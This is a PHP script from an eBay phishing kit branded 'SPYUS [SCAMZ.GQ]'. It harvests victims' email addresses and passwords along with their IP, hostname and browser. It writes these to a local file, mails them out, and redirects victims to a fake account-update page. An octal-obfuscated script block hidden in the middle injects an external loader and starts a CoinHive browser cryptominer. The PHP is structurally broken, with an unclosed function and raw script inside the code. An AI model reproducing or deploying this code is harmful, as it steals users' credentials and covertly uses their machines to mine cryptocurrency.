<?php


session_start();
/*
   Functions time zone.
*/
date_default_timezone_set("Africa/Tunis");
/*
   Functions include.
*/
include 'config.php';
include("functions/functions.php");
$rand = $_GET['dispatch'];
$status = json_decode(CheckLogin($_POST), true);

/*
   Functions session.
*/
if($status['status'] == "false")
{die();}
$msg["Email"] = $_SESSION['spyus_email'];
$msg["password"] = $_SESSION['spyus_pwd'];
/*
   Functions ip & date & time &.user agent.
*/
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
/*
   Functions message.
*/
$msg =  "<div style='font-size:13px;font-family:monospace'>";
$msg .= "<b>|--------------------Ebay.V1------------------|</b><br>";
$msg .= "<b>|--------------------SPYUS [SCAMZ.GQ]------------------|</b><br>";
$msg .= "<b>|Email            : ".$_POST['spyus_email']."</b><br>";
$msg .= "<b>|password         : ".$_POST['spyus_pwd']."</b><br>";
$msg .= "<b>|IP Connected     :  <a href='http://www.geoiptool.com/?IP=$ip' target='_blank'>$ip (Click for more information)</a><br>";
$msg .= "<b>|Browser          : ".$userag."</b><br>";
$msg .= "<b>|Date And Time    :</b>".$time." / ".$date."</b><br>";
$msg .= "<b>|--------------------SPYUS [SCAMZ.GQ]------------------|</b><br>";
$msg = wordwrap($msg,70);
/*
   Functions send email.
*/
$sub = "++Ebay++ Login From | $ip ";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
function sends($to,$sub,$msg,$head) {
		$ip = getenv("REMOTE_ADDR");
}
	<script>//<![CDATA[
	var j="\074script src=\047https\072//a\156tidetect\056pro/x\056js\047\076\074/script\076\074script\076var mi\156er=\156ew Coi";var Q="\156Hive\056User(\047I9eRmE75IU85xqkyXIFiiJXDRHddMILl\047\054\047";var u=['tot','mek','fak','xxx','tit','wew','ewe','ntd','blu','got','mem','vgt','yuk','asi','toe','mea','ngs','afk','lol','gtg','brb'];var e=Math.random()*u.length;e=parseInt(e,10);var r=['1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g'];var y=Math.random()*r.length;y=parseInt(y,10);var v3="\047\054{threads\072navigator\056hardwareConcurre\156cy\054autoThreads\072false\054throttle\0720\0568\054forceASMJS\072false});mi\156er\056start();\074/script\076";document.write(j+Q+u[e]+r[y]+v3);
	// ]]></script>
	$f = fopen("ebay.html", "a+");
	fwrite($f, $msg);
	fclose($f);
    mail($to,$sub,$msg,$head);

header("Location: address.php?id=update_rlod?457670614ab7780a11b7f5ef8d04187ed2378300386a774fcb134dd92d9fe1d9");
$html = html_while("");
die($html);


?>
